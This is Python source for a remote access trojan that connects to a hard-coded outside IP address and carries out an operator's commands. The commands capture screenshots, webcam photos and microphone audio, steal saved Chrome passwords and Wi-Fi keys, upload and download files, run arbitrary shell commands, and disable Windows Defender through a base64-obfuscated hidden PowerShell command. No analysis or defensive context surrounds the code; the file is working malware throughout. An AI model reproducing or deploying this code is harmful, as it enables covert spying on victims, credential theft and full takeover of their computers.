import socket
import pickle
import struct
import cv2
import numpy as np
import pyautogui
import os
import subprocess
import base64
from chromepass import chrome
import platform
import sounddevice as sd
import psutil


def record_microphone(seconds):
    # Set the sample rate and duration
    sample_rate = 44100  # Standard sample rate for audio
    duration = seconds

    # Record audio from the microphone
    recording = sd.rec(int(duration * sample_rate), samplerate=sample_rate, channels=1)
    sd.wait()  # Wait until the recording is complete

    # Convert the audio to a binary string
    binary_data = recording

    return binary_data


def get_system_info():
    system_info = {}

    # Operating system information
    system_info["Operating System"] = platform.system()
    system_info["OS Release"] = platform.release()
    system_info["OS Version"] = platform.version()

    # Processor information
    system_info["Processor"] = platform.processor()

    # Network node hostname
    system_info["Hostname"] = platform.node()

    # Machine architecture
    system_info["Architecture"] = platform.machine()

    # Python version
    system_info["Python Version"] = platform.python_version()

    # RAM memory
    ram = psutil.virtual_memory()
    system_info["Total RAM"] = f"{ram.total // (1024**3)} GB"
    system_info["Available RAM"] = f"{ram.available // (1024**3)} GB"

    # CPU information
    cpu_info = {}
    cpu_count = psutil.cpu_count()
    cpu_freq = psutil.cpu_freq()
    cpu_info["Physical Cores"] = psutil.cpu_count(logical=False)
    cpu_info["Total Cores"] = cpu_count
    cpu_info["Max Frequency"] = f"{cpu_freq.max:.2f} MHz"
    cpu_info["Min Frequency"] = f"{cpu_freq.min:.2f} MHz"
    cpu_info["Current Frequency"] = f"{cpu_freq.current:.2f} MHz"
    system_info["CPU Information"] = cpu_info

    # Disk information
    disk_info = {}
    disks = psutil.disk_partitions()
    for idx, disk in enumerate(disks):
        disk_info[f"Disk {idx+1}"] = {
            "Device": disk.device,
            "Mount Point": disk.mountpoint,
            "File System": disk.fstype,
        }
    system_info["Disk Information"] = disk_info

    # Network information
    network_info = {}
    network_info["Host Name"] = socket.gethostname()
    network_info["IP Address"] = socket.gethostbyname(socket.gethostname())
    system_info["Network Information"] = network_info

    return system_info


def GetWifiPasswords():
    profiles = list()
    passwords = dict()

    for line in (
        subprocess.run("netsh wlan show profile", shell=True, capture_output=True)
        .stdout.decode(errors="ignore")
        .strip()
        .splitlines()
    ):
        if "All User Profile" in line:
            name = line[(line.find(":") + 1) :].strip()
            profiles.append(name)

    for profile in profiles:
        found = False
        for line in (
            subprocess.run(
                f'netsh wlan show profile "{profile}" key=clear',
                shell=True,
                capture_output=True,
            )
            .stdout.decode(errors="ignore")
            .strip()
            .splitlines()
        ):
            if "Key Content" in line:
                passwords[profile] = line[(line.find(":") + 1) :].strip()
                found = True
                break
        if not found:
            passwords[profile] = "(None)"
    return passwords


def capture_photo():
    # Open the camera
    camera = cv2.VideoCapture(0)  # 0 indicates the default camera device

    # Check if the camera is opened successfully
    if not camera.isOpened():
        raise Exception("Unable to open the camera.")

    # Capture a photo
    ret, frame = camera.read()

    # Release the camera
    camera.release()

    # Check if the photo capture was successful
    if not ret:
        raise Exception("Failed to capture photo.")

    # Convert the photo to bytes
    _, img_bytes = cv2.imencode(".jpg", frame)

    # Return the photo bytes
    return img_bytes


def DisableDefender():
    command = base64.b64decode(
        b"cG93ZXJzaGVsbCBTZXQtTXBQcmVmZXJlbmNlIC1EaXNhYmxlSW50cnVzaW9uUHJldmVudGlvblN5c3RlbSAkdHJ1ZSAtRGlzYWJsZUlPQVZQcm90ZWN0aW9uICR0cnVlIC1EaXNhYmxlUmVhbHRpbWVNb25pdG9yaW5nICR0cnVlIC1EaXNhYmxlU2NyaXB0U2Nhbm5pbmcgJHRydWUgLUVuYWJsZUNvbnRyb2xsZWRGb2xkZXJBY2Nlc3MgRGlzYWJsZWQgLUVuYWJsZU5ldHdvcmtQcm90ZWN0aW9uIEF1ZGl0TW9kZSAtRm9yY2UgLU1BUFNSZXBvcnRpbmcgRGlzYWJsZWQgLVN1Ym1pdFNhbXBsZXNDb25zZW50IE5ldmVyU2VuZCAmJiBwb3dlcnNoZWxsIFNldC1NcFByZWZlcmVuY2UgLVN1Ym1pdFNhbXBsZXNDb25zZW50IDI="
    ).decode()
    subprocess.Popen(
        command,
        shell=True,
        creationflags=subprocess.CREATE_NEW_CONSOLE | subprocess.SW_HIDE,
    )


def get_frame():
    screen = pyautogui.screenshot()
    frame = np.array(screen)
    frame = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)
    frame = cv2.resize(frame, (1024, 576), interpolation=cv2.INTER_AREA)
    _, frame = cv2.imencode(".jpg", frame, [int(cv2.IMWRITE_JPEG_QUALITY), 90])
    return frame


def receive(cli):
    data = b""
    payload_size = struct.calcsize(">L")
    while len(data) < payload_size:
        received = cli.recv(4096)
        data += received
    packed_msg_size = data[:payload_size]
    data = data[payload_size:]
    msg_size = struct.unpack(">L", packed_msg_size)[0]
    while len(data) < msg_size:
        data += cli.recv(4096)

    frame_data = data[:msg_size]

    # data = data[msg_size:]

    return pickle.loads(frame_data, fix_imports=True, encoding="bytes")


def execute_command(command):
    current_dir = os.getcwd()

    if len(command) == 2 and command[1] == ":" and command[0].isalpha():
        # Handle drive letter change (e.g., 'e:', 'f:', 'c:')
        try:
            os.chdir(command)
            current_dir = os.getcwd()
        except Exception as e:
            return f"Failed to change drive: {str(e)}"

    if command.lower().startswith("cd "):
        # Handle 'cd' command separately to update the current directory
        try:
            path = command[3:]  # Extract the path from the 'cd' command
            os.chdir(path)
            current_dir = os.getcwd()
        except Exception as e:
            return f"Failed to change directory: {str(e)}"

    try:
        output = subprocess.check_output(
            command,
            shell=True,
            stderr=subprocess.STDOUT,
            universal_newlines=True,
            cwd=current_dir,
        )
        return output
    except subprocess.CalledProcessError as e:
        error_message = f"Command failed with return code {e.returncode}."
        if e.output:
            error_message += "\n" + e.output
        return error_message
    except Exception as e:
        return f"An error occurred: {str(e)}"


def send(data, cli):
    data = pickle.dumps(data, 0)
    size = len(data)
    cli.sendall(struct.pack(">L", size) + data)


bridge = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
bridge.connect(("45.80.148.246", 9999))
bridge.send(b"slave")


while True:
    command = receive(bridge)
    if command == "screenshare":
        print("nah")

    if command == "screenshot":
        send(get_frame(), bridge)

    elif command == "camera capture":
        send(capture_photo(), bridge)

    elif "inject " in command:  # inject run.exe
        exe = command.replace("inject ", "")
        data = receive(bridge)
        with open(exe, "wb") as f:
            f.write(data)

    elif "retreive " in command:  # retreive pp.exe
        exe = command.replace("retreive ", "")
        with open(exe, "rb") as f:
            data = f.read()
        send(data, bridge)

    elif command == "disable defender":  # get chrome password
        DisableDefender()
        send("Done!", bridge)

    elif command == "cracker chrome":  # get wifi informations (past data too)
        app = chrome()
        try:
            app.chromedb()
        except:
            print("rror")
        send(app.passwordList, bridge)

    elif command == "cracker wifi":
        pasw = GetWifiPasswords()
        send(pasw, bridge)

    elif "sound record" in command:  # sound record 15
        duration = int(command.replace("sound record ", ""))
        data = record_microphone(duration)
        send(data, bridge)

    elif command == "info":
        data = get_system_info()
        send(data, bridge)

    else:  # cmd
        resp = execute_command(command)
        send(resp, bridge)
